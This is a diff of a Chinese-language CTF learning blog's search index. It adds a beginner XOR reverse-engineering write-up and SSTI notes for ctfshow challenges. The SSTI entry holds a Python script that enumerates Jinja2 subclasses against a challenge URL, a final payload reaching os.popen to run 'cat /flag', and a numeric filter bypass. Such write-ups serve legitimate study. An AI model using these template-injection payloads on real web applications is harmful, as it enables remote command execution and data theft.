@@ -1,38 +1,240 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>[SWPUCTF 2021 新生赛]简简单单的逻辑</title>
+    <url>/2025/03/02/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-%E7%AE%80%E7%AE%80%E5%8D%95%E5%8D%95%E7%9A%84%E9%80%BB%E8%BE%91/</url>
+    <content><![CDATA[<p>因为主播本人没什么CS知识全靠DS所以小记一下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;xxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">47</span>, <span class="number">138</span>, <span class="number">127</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">143</span>, <span class="number">17</span>, <span class="number">84</span>, <span class="number">42</span>, <span class="number">135</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">28</span>, <span class="number">169</span>, <span class="number">25</span>]</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    key = (<span class="built_in">list</span>[i]&gt;&gt;<span class="number">4</span>)+((<span class="built_in">list</span>[i] &amp; <span class="number">0xf</span>)&lt;&lt;<span class="number">4</span>)</span><br><span class="line">    result += <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(flag[i])^key))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># result=bcfba4d0038d48bd4b00f82796d393dfec</span></span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>代码中，key的计算方式是：将list中的每个元素右移4位，然后加上该元素与0xf（即二进制的1111）进行按位与操作后的结果左移4位。这可能等同于交换该字节的高四位和低四位。</p>
+<p>比如，如果一个字节是0xab（二进制10101011），右移4位得到0x0a，而低四位是0x0b，左移4位得到0xb0。相加就是0xba。所以这个过程实际上是将原字节的高四位和低四位交换位置。</p>
+<table>
+<thead>
+<tr>
+<th>字符索引</th>
+<th>list值</th>
+<th>key(十进制)</th>
+<th>十六进制值</th>
+<th>异或结果(ASCII)</th>
+<th>字符</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>47</td>
+<td>242</td>
+<td></td>
+<td></td>
+<td>N</td>
+</tr>
+<tr>
+<td>1</td>
+<td>138</td>
+<td>168</td>
+<td></td>
+<td></td>
+<td>S</td>
+</tr>
+<tr>
+<td>2</td>
+<td>127</td>
+<td>247</td>
+<td></td>
+<td></td>
+<td>S</td>
+</tr>
+<tr>
+<td>3</td>
+<td>57</td>
+<td>147</td>
+<td></td>
+<td></td>
+<td>C</td>
+</tr>
+<tr>
+<td>4</td>
+<td>117</td>
+<td>87</td>
+<td></td>
+<td></td>
+<td>T</td>
+</tr>
+<tr>
+<td>5</td>
+<td>188</td>
+<td>203</td>
+<td></td>
+<td></td>
+<td>F</td>
+</tr>
+<tr>
+<td>6</td>
+<td>51</td>
+<td>51</td>
+<td></td>
+<td></td>
+<td>{</td>
+</tr>
+<tr>
+<td>7</td>
+<td>143</td>
+<td>248</td>
+<td></td>
+<td></td>
+<td>E</td>
+</tr>
+<tr>
+<td>8</td>
+<td>17</td>
+<td>17</td>
+<td></td>
+<td></td>
+<td>Z</td>
+</tr>
+<tr>
+<td>9</td>
+<td>84</td>
+<td>69</td>
+<td></td>
+<td></td>
+<td>E</td>
+</tr>
+<tr>
+<td>10</td>
+<td>42</td>
+<td>162</td>
+<td></td>
+<td></td>
+<td>Z</td>
+</tr>
+<tr>
+<td>11</td>
+<td>135</td>
+<td>120</td>
+<td></td>
+<td></td>
+<td>_</td>
+</tr>
+<tr>
+<td>12</td>
+<td>76</td>
+<td>196</td>
+<td></td>
+<td></td>
+<td>R</td>
+</tr>
+<tr>
+<td>13</td>
+<td>105</td>
+<td>150</td>
+<td></td>
+<td></td>
+<td>E</td>
+</tr>
+<tr>
+<td>14</td>
+<td>28</td>
+<td>193</td>
+<td></td>
+<td></td>
+<td>R</td>
+</tr>
+<tr>
+<td>15</td>
+<td>169</td>
+<td>154</td>
+<td></td>
+<td></td>
+<td>E</td>
+</tr>
+<tr>
+<td>16</td>
+<td>25</td>
+<td>145</td>
+<td></td>
+<td></td>
+<td>}</td>
+</tr>
+</tbody></table>
+<p>只是想看看表格长什么样子</p>
+<p>0       47      242        0xbc       78              N<br>1       138     168        0xfb       83              S<br>2       127     247        0xa4       83              S<br>3       57      147        0xd0       67              C<br>4       117     87         0x03       84              T<br>5       188     203        0x8d       70              F<br>6       51      51         0x48       123             {<br>7       143     248        0xbd       69              E<br>8       17      17         0x4b       90              Z<br>9       84      69         0x00       69              E<br>10      42      162        0xf8       90              Z<br>11      135     120        0x27       95              _<br>12      76      196        0x96       82              R<br>13      105     150        0xd3       69              E<br>14      28      193        0x93       82              R<br>15      169     154        0xdf       69              E<br>16      25      145        0xec       125             }</p>
+]]></content>
+      <categories>
+        <category>Basic</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>XOR</tag>
+        <tag>算法分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSTI集中学习题目汇总</title>
+    <url>/2025/03/01/SSTI%E9%9B%86%E4%B8%AD%E5%AD%A6%E4%B9%A0%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB/</url>
+    <content><![CDATA[<p>从纯新手角度写写怎么做SSTI题</p>
+<p>两个阶段目标：1.找到我要的类 2.执行命令</p>
+<p>找到我要的类 分为两步 1. 找到object类 2.再往下找要的类（写脚本</p>
+<span id="more"></span>
+
+<h1 id="ctfshow-web361"><a href="#ctfshow-web361" class="headerlink" title="ctfshow web361"></a>ctfshow web361</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[-1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>已经完成找到object类 ，往下找会出现很多很多的类</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[-1].__subclasses__()[i]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会出现不一样的类</p>
+<p>那么写一个脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    param = <span class="string">&quot;&#123;&#123;%22%22.__class__.__mro__[-1].__subclasses__()[&quot;</span>+<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span>+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">    url = <span class="string">f&quot;https://beb946ec-07b3-4f06-af0a-983aa96cdde7.challenge.ctf.show/?name=<span class="subst">&#123;param&#125;</span>&quot;</span></span><br><span class="line">    response = requests.get(url,verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;wrap&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p>132</p>
+<pre><code>&lt;div class=&quot;center-content error&quot;&gt;
+    &lt;h1&gt;Hello&lt;/h1&gt;
+    &lt;h3&gt;&amp;lt;class &amp;#39;os._wrap_close&amp;#39;&amp;gt;&lt;/h3&gt;
+&lt;/div&gt; 
+</code></pre>
+<p>最终payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://beb946ec-07b3-4f06-af0a-983aa96cdde7.challenge.ctf.show/?name=&#123;&#123;&quot;&quot;.__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<p>这段哪来的不要问我，我还没学明白</p>
+<h1 id="ctfshow-web362"><a href="#ctfshow-web362" class="headerlink" title="ctfshow web362"></a>ctfshow web362</h1><p>过滤了数字2,3等</p>
+<h2 id="数字型绕过"><a href="#数字型绕过" class="headerlink" title="数字型绕过"></a>数字型绕过</h2><p>132&#x3D;140-8&#x3D;114%2b18&#x3D;11*11%2b+11（+号在url中＝空格所以写成%2b）</p>
+<h2 id="用其他的类"><a href="#用其他的类" class="headerlink" title="用其他的类"></a>用其他的类</h2><h3 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen()"></a>subprocess.Popen()</h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>博客建设记录</title>
-    <url>/2025/02/14/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E8%AE%BE%E8%AE%B0%E5%BD%95/</url>
+    <url>/2025/03/01/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E8%AE%BE%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<p>主题：next gemini</p>
 <p>25&#x2F;3&#x2F;1</p>
 <p>换主题</p>
-<p>auto_excerpt:			#自动摘录（不推荐）  </p>
-<p>enable: false  </p>
+<p>auto_excerpt: #自动摘录（不推荐）</p>
+<p>enable: false</p>
 <p>length: 150</p>
 <p>(这个没有用)</p>
-<p>只能用<span id="more"></span></p>
+<p>只能用</p>
+<span id="more"></span>
+
 <p>*评论系统：valine（能看得到评论界面无法评论）</p>
 <p>*加密：测试后发现输入密码后有回显但是无法看到文章</p>
-<!--more-->
-
 <p>看板娘；神秘出现,</p>
 <p>我就输入了npm install hexo-helper-live2d –save 这一条命令就行了吗？？？</p>
 <p>25&#x2F;2&#x2F;24</p>
 <p>因为 遮挡了右边目录删掉了看板娘，画风不符</p>
 <p>25&#x2F;2&#x2F;27</p>
-<img src="/2025/02/14/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E8%AE%BE%E8%AE%B0%E5%BD%95/E8FE32616C6A10880D0E42AB9041634E.png" class="" title="E8FE32616C6A10880D0E42AB9041634E">
-
-<img src="/2025/02/14/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E8%AE%BE%E8%AE%B0%E5%BD%95/EF5FCA7498781CC07C04C295087FAA47.png" class="" title="EF5FCA7498781CC07C04C295087FAA47">
-
 ]]></content>
       <categories>
         <category>Index</category>
       </categories>
-  </entry>
-  <entry>
-    <title>SSTI集中学习题目汇总</title>
-    <url>/2025/03/01/SSTI%E9%9B%86%E4%B8%AD%E5%AD%A6%E4%B9%A0%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>[FSCTF 2023]base套</title>
@@ -645,7 +847,8 @@
     <url>/2025/02/21/CS%E5%85%A5%E9%97%A8%E9%BB%91%E8%AF%9D%E6%94%B6%E9%9B%86/</url>
     <content><![CDATA[<p>此为个人理解，争取往大白话，口语化方向看齐。</p>
 <h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><h1 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h1><h1 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h1><h1 id="CMD指纹"><a href="#CMD指纹" class="headerlink" title="CMD指纹"></a>CMD指纹</h1><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><h1 id="0day"><a href="#0day" class="headerlink" title="0day"></a>0day</h1><p>没有被公开发表的漏洞。也就是说你做这道题不可以查已经发表的CVE来复现得到flag。</p>
-<h1 id="SRC"><a href="#SRC" class="headerlink" title="SRC"></a>SRC</h1><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><h1 id="webshell-shell-web"><a href="#webshell-shell-web" class="headerlink" title="webshell shell web"></a>webshell shell web</h1><h1 id="cookie-session-token"><a href="#cookie-session-token" class="headerlink" title="cookie session token"></a>cookie session token</h1><h1 id="jwt-js"><a href="#jwt-js" class="headerlink" title="jwt js"></a>jwt js</h1><p>JWT 由三部分组成： Header 头部、 Payload 负载 和 Signature 签名，它是一个很长的字符串，中间用点（.）隔开。客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</p>
+<h1 id="SRC"><a href="#SRC" class="headerlink" title="SRC"></a>SRC</h1><h1 id="wp-exp-poc-payload"><a href="#wp-exp-poc-payload" class="headerlink" title="wp exp poc payload"></a>wp exp poc payload</h1><p>“答案”</p>
+<h1 id="webshell-shell-web"><a href="#webshell-shell-web" class="headerlink" title="webshell shell web"></a>webshell shell web</h1><h1 id="cookie-session-token"><a href="#cookie-session-token" class="headerlink" title="cookie session token"></a>cookie session token</h1><h1 id="jwt-js"><a href="#jwt-js" class="headerlink" title="jwt js"></a>jwt js</h1><p>JWT 由三部分组成： Header 头部、 Payload 负载 和 Signature 签名，它是一个很长的字符串，中间用点（.）隔开。客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Header</span>.<span class="property">Payload</span>.<span class="property">Signature</span></span><br></pre></td></tr></table></figure>
 
 <p>长这样：</p>
